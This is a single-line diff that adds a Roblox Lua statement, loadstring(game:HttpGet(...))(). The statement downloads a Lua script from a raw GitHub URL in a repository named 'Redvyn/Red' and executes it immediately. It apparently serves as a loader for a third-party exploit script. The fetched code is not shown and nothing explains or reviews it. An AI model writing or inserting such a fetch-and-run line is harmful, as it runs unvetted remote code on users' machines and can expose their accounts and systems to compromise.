@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Redvyn/Red/main/07090a00.lua", true))()
